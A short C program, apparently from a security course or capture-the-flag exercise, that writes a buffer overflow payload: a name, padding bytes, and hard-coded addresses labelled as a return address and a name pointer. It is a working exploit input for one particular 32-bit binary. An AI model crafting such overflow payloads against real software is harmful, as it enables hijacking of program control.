#include <stdio.h>

int main(void){
 int i;
fputs("Georgios Mpekas", stdout);
  
for(i = 0; i < 33; i++){
    putchar('\0');
}
  putchar('8');


/*retAdress*/
  putchar(0x68);
  putchar(0x8b);
  putchar(0x04);
  putchar(0x08);

/*name*/
  putchar(0xe0);
  putchar(0x65);
  putchar(0x0d);
  putchar(0x08);

  return 0;
}

